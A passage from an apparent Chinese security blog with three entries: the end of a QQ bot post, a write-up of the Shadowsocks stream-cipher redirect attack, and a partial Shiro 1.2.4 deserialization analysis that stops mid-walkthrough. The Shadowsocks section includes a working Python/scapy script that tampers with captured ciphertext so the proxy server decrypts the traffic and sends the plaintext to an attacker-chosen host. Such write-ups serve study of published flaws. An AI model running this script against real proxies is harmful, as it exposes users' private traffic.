同意所有加群、加好友请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bot.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>之前已经将docker和宿主机的&#x2F;root&#x2F;coolq-data目录挂载了，python文件传到这里就可</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416184852576.png" alt="image-20200416184852576"></p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416184842915.png" alt="image-20200416184842915"></p>
<p>还要修改下CoolQ HTTP API 配置并重启应用</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416185325979.png" alt="image-20200416185325979"></p>
<p>测试如下</p>
<p><img src="/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/image-20200416185453205.png" alt="image-20200416185453205"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cqhttp.cc/docs/4.14/#/">CoolQ HTTP API</a></p>
<p><a href="https://github.com/cqmoe/python-cqhttp">python-cqhttp</a></p>
]]></content>
      <tags>
        <tag>QQ机器人</tag>
      </tags>
  </entry>
  <entry>
    <title>Shadowsocks协议重定向攻击</title>
    <url>/2020/02/29/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>Shadowsocks是一个基于SOCKS5的代理软件，其主要用途就不用解释了， 其协议存在漏洞，可以通过重定向攻击解密shadowsocks数据包密文。以下总结参考自<a href="https://github.com/edwardz246003/shadowsocks">Zhiniang Peng</a>的研究成果</p>
<span id="more"></span>

<h2 id="Shadowsocks工作原理"><a href="#Shadowsocks工作原理" class="headerlink" title="Shadowsocks工作原理"></a>Shadowsocks工作原理</h2><p>sslocal运行于本地，并监听某端口（默认1080）提供代理服务，ssserver运行于远程服务器，并监听某端口（默认8388）接收来自sslocal的数据</p>
<p>浏览器设置代理，所有请求首先发给sslocal，sslocal将数据进行加密后发给ssserver，ssserver解密数据包，并转发浏览器的请求，然后将结果加密返回，sslocal解密并返回给浏览器</p>
<p>client &lt;—&gt; ss-local &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227152619465.png" alt="image-20200227152619465"></p>
<p>可以通过pip安装python版Shadowsocks，在包存放路径下找到源码</p>
<p><code>python3 -m pip install shadowsocks</code></p>
<h3 id="请求流程"><a href="#请求流程" class="headerlink" title="请求流程"></a>请求流程</h3><p>sslocal通过发送以目标地址开头，后跟请求数据的包的密文来启动与ssserver的TCP连接</p>
<p><code>message=[target address][payload]</code></p>
<p><code>ciphertext=Stream_encrypt(key,IV,message)</code></p>
<p>最后发送的其实就是<code>随机生成的16字节的IV+ciphertext</code></p>
<p>ssserver接收数据并解密</p>
<p><code>message=Stream_decrypt(key,IV,ciphertext)</code>  </p>
<p>并解析出<code>[target address]</code>。 然后与<code>[target address]</code>建立新的TCP连接，并向目标转发请求。ssserver接收到来自<code>[target address]</code>的回复，进行加密并将其转发回sslocal，直到sslocal断开连接</p>
<p>sslocal收到的数据也是</p>
<p><code>随机生成的16字节的IV+response的密文</code></p>
<h3 id="Address-格式"><a href="#Address-格式" class="headerlink" title="Address 格式"></a>Address 格式</h3><p>第一个字节用以说明地址类型</p>
<ul>
<li><p>0x01：host是4字节的IPv4地址</p>
</li>
<li><p>0x03：host是可变长度的字符串，以1个字节开头作为长度，后跟最多255个字节的域名</p>
</li>
<li><p>0x04：host是一个16字节的IPv6地址</p>
</li>
</ul>
<p>端口号是一个2字节无符号整数</p>
<p><code>[1-byte type][variable-length host][2-byte port]</code></p>
<h2 id="AES-256-CFB"><a href="#AES-256-CFB" class="headerlink" title="AES-256-CFB"></a>AES-256-CFB</h2><p>以AES-256-CFB加密方式为例</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227162247002.png" alt="image-20200227162247002"></p>
<p>这种加密方式，明文和密文是等长的，解密过程如上。如果将密文的第一个块从c1修改为c1’，那么第一个明文块将从p1变为p1’，第二个分组的数据将会错误解密</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227170902068.png" alt="image-20200227170902068"></p>
<p>他们的关系如下</p>
<blockquote>
<p>c1’&#x3D;xor(c1,r)<br>p1’&#x3D;xor(p1,r)</p>
</blockquote>
<h2 id="请求重定向攻击"><a href="#请求重定向攻击" class="headerlink" title="请求重定向攻击"></a>请求重定向攻击</h2><p>再回顾一下sslocal发送给ssserver的数据</p>
<p><code>IV+encrypt([target address][payload])</code></p>
<p>其中<code>[payload]</code>是加密的无法得知，但如果能控制<code>[target address]</code>并将其改为自己可控的服务器端<code>[evil address]</code>再将修改后的包发送给ssserver，那么ssserver岂不是帮我们解密了<code>[payload]</code>并且将请求转发到了<code>[evil address]</code></p>
<p>假设使用的是IPv4地址，那么要构造一个<code>[target address]</code>，就需要控制p1’的前7个字节，需要控制p1’的前7个字节就需要知道p1的前7个字节</p>
<p>而HTTP的响应包前7个字节是固定的，即<code>HTTP/1.</code></p>
<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p>服务端运行ssserver</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227174302999.png" alt="image-20200227174302999"></p>
<p>客户端我用python版的时候有点小问题，所以就直接用这个了</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227174500978.png" alt="image-20200227174500978"></p>
<p>用wireshark开始抓包，并使用curl通过代理请求百度，保存抓包结果p.pcapng</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227174710233.png" alt="image-20200227174710233"></p>
<p>攻击代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> rdpcap</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">packets = rdpcap(<span class="string">&quot;p.pcapng&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ssserver的ip和端口，用以筛选数据包和发送修改后的数据包</span></span><br><span class="line">sport=<span class="number">8388</span></span><br><span class="line">src=<span class="string">&quot;xx.xx.xx.xx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#要转发的目标地址，用以接收解密后的数据</span></span><br><span class="line">target_ip = <span class="string">&quot;xx.xx.xx.xx&quot;</span></span><br><span class="line">target_port = <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;TCP&quot;</span> <span class="keyword">in</span> packet <span class="keyword">and</span> packet[<span class="string">&#x27;TCP&#x27;</span>].payload:</span><br><span class="line">        <span class="comment">#筛选一下数据包，需要ssserver返回给sslocal的数据包</span></span><br><span class="line">        <span class="keyword">if</span> packet[<span class="string">&quot;IP&quot;</span>].src==src <span class="keyword">and</span> packet[<span class="string">&quot;TCP&quot;</span>].sport==sport <span class="keyword">and</span> <span class="built_in">len</span>(packet[<span class="string">&#x27;TCP&#x27;</span>].payload.load)&gt;<span class="number">16</span>:</span><br><span class="line">            <span class="comment">#分隔出16字节的随机IV和数据密文</span></span><br><span class="line">            recv_iv, recv_data=packet[<span class="string">&#x27;TCP&#x27;</span>].payload.load[:<span class="number">16</span>],packet[<span class="string">&#x27;TCP&#x27;</span>].payload.load[<span class="number">16</span>:]</span><br><span class="line">            <span class="comment">#HTTP响应包的前7位固定是HTTP/1.</span></span><br><span class="line">            predict_data = <span class="string">b&quot;HTTP/1.&quot;</span></span><br><span class="line">            <span class="comment">#在关系式 c1&#x27;=xor(c1,r) p1&#x27;=xor(p1,r) 中，predict_xor_key相当于计算r</span></span><br><span class="line">            predict_xor_key = <span class="built_in">bytes</span>([(predict_data[i] ^ recv_data[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(predict_data))])</span><br><span class="line">            <span class="comment">#构造[evil address]</span></span><br><span class="line">            fake_header = <span class="string">b&#x27;\x01&#x27;</span> + socket.inet_pton(socket.AF_INET, target_ip) + <span class="built_in">bytes</span>(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, target_port))</span><br><span class="line">            <span class="comment">#计算[evil address]的密文</span></span><br><span class="line">            fake_header = <span class="built_in">bytes</span>([(fake_header[i] ^ predict_xor_key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_header))])</span><br><span class="line">            <span class="comment">#拼接修改后的数据</span></span><br><span class="line">            fake_data = recv_iv + fake_header + recv_data[<span class="built_in">len</span>(fake_header):]</span><br><span class="line">            <span class="built_in">print</span>(fake_data.<span class="built_in">hex</span>())</span><br><span class="line">            s = socket.socket()</span><br><span class="line">            <span class="comment">#将修改后的数据发送给ssserver</span></span><br><span class="line">            s.connect((src, sport))</span><br><span class="line">            s.send(fake_data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Tcp sending... &#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<p>在target_ip监听相应端口即可收到解密后的HTTP响应包</p>
<p><img src="/Shadowsocks%E5%8D%8F%E8%AE%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/image-20200227180856311.png" alt="image-20200227180856311"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/edwardz246003/shadowsocks">Redirect attack on Shadowsocks stream ciphers</a></p>
<p><a href="https://www.ioiogoo.cn/2016/12/22/shadowsocks%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/">shadowsocks源码解读（一）：基本流程</a></p>
<p><a href="https://www.leadroyal.cn/?p=1036">ss协议漏洞的复现和利用</a></p>
]]></content>
      <tags>
        <tag>Shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro 1.2.4 反序列化漏洞</title>
    <url>/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>Shiro作为Java的一个安全框架，其中提供了登录时的RememberMe功能，让用户在浏览器关闭重新打开后依然能恢复之前的会话。而实现原理就是将储存用户身份的对象序列化并通过AES加密、base64编码储存在cookie中，只要能伪造cookie就能让服务器反序列化任意对象，而1.2.4版本及以下AES加密时采用的key是硬编码在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
<span id="more"></span>

<h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><p>Apache Shiro 是 Java 的一个安全框架，可以帮助我们完成：认证、授权、加密、会话管理等。类似的还有Spring Security，相较之下Shiro更加简单易用且灵活，不跟任何的框架或者容器绑定，可以独立运行。</p>
<p>Shiro下载</p>
<p><code>git clone https://github.com/apache/shiro.git</code></p>
<p>然后可以进入其.&#x2F;samples&#x2F;quickstart目录运行下Demo了解Shiro的使用</p>
<p><code>mvn compile exec:java</code>（失败的话尝试先配置下代理）</p>
<p>首先看一下配置文件quickstart&#x2F;src&#x2F;main&#x2F;resources&#x2F;shiro.ini</p>
<p>[users]中创建了几个用户并设置了其密码和角色</p>
<p>[roles]中创建了不同角色及并设置了其权限</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321144658861.png" alt="image-20200321144658861"></p>
<p>然后查看我们运行的Demo代码</p>
<p>&#x2F;quickstart&#x2F;src&#x2F;main&#x2F;java&#x2F;Quickstart.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Quickstart</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">transient</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(Quickstart.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 载入ini文件，创建Factory</span></span><br><span class="line">        <span class="comment">// 实际业务中应该是从数据库中加载账户信息等数据</span></span><br><span class="line">        Factory&lt;SecurityManager&gt; factory = <span class="keyword">new</span> <span class="title class_">IniSecurityManagerFactory</span>(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> factory.getInstance();</span><br><span class="line"></span><br><span class="line">        SecurityUtils.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get the currently executing user:</span></span><br><span class="line">        <span class="type">Subject</span> <span class="variable">currentUser</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do some stuff with a Session (no need for a web or EJB container!!!)</span></span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> currentUser.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">&quot;someKey&quot;</span>, <span class="string">&quot;aValue&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) session.getAttribute(<span class="string">&quot;someKey&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (value.equals(<span class="string">&quot;aValue&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Retrieved the correct value! [&quot;</span> + value + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// let&#x27;s login the current user so we can check against roles and permissions:</span></span><br><span class="line">        <span class="keyword">if</span> (!currentUser.isAuthenticated()) &#123;</span><br><span class="line">            <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(<span class="string">&quot;lonestarr&quot;</span>, <span class="string">&quot;vespa&quot;</span>);</span><br><span class="line">            token.setRememberMe(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                currentUser.login(token);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownAccountException uae) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;There is no user with username of &quot;</span> + token.getPrincipal());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IncorrectCredentialsException ice) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;Password for account &quot;</span> + token.getPrincipal() + <span class="string">&quot; was incorrect!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LockedAccountException lae) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;The account for username &quot;</span> + token.getPrincipal() + <span class="string">&quot; is locked.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Please contact your administrator to unlock it.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ... catch more exceptions here (maybe custom ones specific to your application?</span></span><br><span class="line">            <span class="keyword">catch</span> (AuthenticationException ae) &#123;</span><br><span class="line">                <span class="comment">//unexpected condition?  error?</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//say who they are:</span></span><br><span class="line">        <span class="comment">//print their identifying principal (in this case, a username):</span></span><br><span class="line">        log.info(<span class="string">&quot;User [&quot;</span> + currentUser.getPrincipal() + <span class="string">&quot;] logged in successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//test a role:</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.hasRole(<span class="string">&quot;schwartz&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;May the Schwartz be with you!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Hello, mere mortal.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//test a typed permission (not instance-level)</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.isPermitted(<span class="string">&quot;lightsaber:wield&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;You may use a lightsaber ring.  Use it wisely.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Sorry, lightsaber rings are for schwartz masters only.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//a (very powerful) Instance Level permission:</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.isPermitted(<span class="string">&quot;winnebago:drive:eagle5&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;You are permitted to &#x27;drive&#x27; the winnebago with license plate (id) &#x27;eagle5&#x27;.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Here are the keys - have fun!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Sorry, you aren&#x27;t allowed to drive the &#x27;eagle5&#x27; winnebago!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//all done - log out!</span></span><br><span class="line">        currentUser.logout();</span><br><span class="line"></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Demo中对session和用户的登录，角色，权限进行了测试，对照运行的输出<br><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png" alt="image-20200321145837383"></p>
<h2 id="动调环境搭建"><a href="#动调环境搭建" class="headerlink" title="动调环境搭建"></a>动调环境搭建</h2><p>下载Shiro并切换到漏洞版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<p>编辑shiro&#x2F;samples&#x2F;web&#x2F;pom.xml文件</p>
<p>jstl是为了Demo正常运行，否则无法识别jsp标签</p>
<p>commons-collections4是配合shiro反序列化点组成一条完整的利用链</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后用idea导入shiro&#x2F;samples&#x2F;web项目，等待idea自动下载导入项目依赖的包</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png" alt="image-20200321161842461"></p>
<p>然后Run -&gt; Edit Configurations 添加TomcatServer</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png" alt="image-20200321162413295"></p>
<p>设置Tomcat路径并添加Artifact</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png" alt="image-20200321162537299"></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png" alt="image-20200321162602475"></p>
<p>然后就可以调试运行了</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png" alt="image-20200321162720187"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://issues.apache.org/jira/browse/SHIRO-550">[SHIRO-550] Randomize default remember me cipher - ASF JIRA</a>的描述已经比较清楚了</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png" alt="image-20200321163758120"></p>
<ul>
<li>检索<code>RememberMe</code> cookie 的值</li>
<li>Base 64解码</li>
<li>使用AES解密</li>
<li>使用Java序列化（<code>ObjectInputStream</code>）反序列化</li>
</ul>
<p>在登录时勾选<code>RememberMe</code></p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png" alt="image-20200321170531049"></p>
<p>然后cookie中就会储存<code>RememberMe</code>键值对</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png" alt="image-20200321170728781"></p>
<p>解密AES需要密钥还有mode（加解密算法）和 IV（初始化向量），而由官网得知<code>RememberMe</code>在CookieRememberMeManager实现</p>
<p>idea中ctrl+n搜索该类名可以快速定位</p>
<p>org.apache.shiro.web.mgt.CookieRememberMeManager</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png" alt="image-20200321172033719"></p>
<p>该类继承自AbstractRememberMeManager</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png" alt="image-20200321174309740"></p>
<p>很容易发现默认的Key是硬编码在其中的，这也是该反序列得以利用的关键，如果再确定mode和IV则可以构造<code>RememberMe</code>的值，然后让其反序列化</p>
<h3 id="序列化、加密过程"><a href="#序列化、加密过程" class="headerlink" title="序列化、加密过程"></a>序列化、加密过程</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin下断点，然后开始Debug</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png" alt="image-20200321201103424"></p>
<p>在登录界面勾选Remember Me并登录</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png" alt="image-20200321201229223"></p>
<p>登录成功即会在onSuccessfulLogin断点处停下</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png" alt="image-20200321201833615"></p>
<p>85行则对rememberMe的值进行判断，如果登录时勾选了则为true，然后进入</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png" alt="image-20200321202502782"></p>
<p>94行获取身份即 root，然后进入</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png" alt="image-20200321202614429"></p>
<p>103行将用户身份转换为byte[]，跟入看一下</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png" alt="image-20200321202938567"></p>
<p>在这个函数里将用户身份进行了序列化和加密，最后返回的是密文byte[]</p>
<p>继续跟入序列化的处理流程的话</p>
<p>org.apache.shiro.io.DefaultSerializer#serialize</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png" alt="image-20200321203344204"></p>
<p>采用的是java原生的序列化方法writeObject，而最后序列化的数据也就是代表用户身份的SimplePrincipalCollection类的实例，该类实现的接口的父辈接口继承了Serializable接口</p>
<p>返回去接着看加密过程</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png" alt="image-20200321204401719"></p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png" alt="image-20200321204557024"></p>
<p>154行得到一个用来加密的CipherService对象，跟入会发现返回的是当前类的<code>private CipherService cipherService = new AesCipherService();</code>并且在AesCipherService父类完成CipherService对象的初始化，此时就确定了AES加密方式及mod</p>
<p>在当前Debug处就可以看到该对象的信息，比如mod，这里采用的是CBC</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png" alt="image-20200321205506865"></p>
<p>接着到了156行，cipherService.encrypt方法第一个参数是序列化后的字节数组，第二个参数即是加AES的key</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png" alt="image-20200321205933941"></p>
<p>这里的key是在AbstractRememberMeManager类的构造函数里完成初始化，其值就是硬编码的key</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png" alt="image-20200321205846991"></p>
<p>跟入cipherService.encrypt</p>
<p>org.apache.shiro.crypto.JcaCipherService#encrypt</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png" alt="image-20200321210454929"></p>
<p>在147行跟入的话会发现IV是随机生成的，接着在153行，传入this.encrypt的参数分别是序列化数据，AES的key，AES的IV和一个值为true的布尔值，跟入</p>
<p>org.apache.shiro.crypto.JcaCipherService#encrypt</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png" alt="image-20200321212123639"></p>
<p>在162行将16字节的IV放入了output，接着放入密文数据，最后返回Util.bytes(output)</p>
<p>后面一直return到</p>
<p>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</p>
<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png" alt="image-20200321212426443"></p>
<p>加密过程结束</p>
<p>然后回到</p>
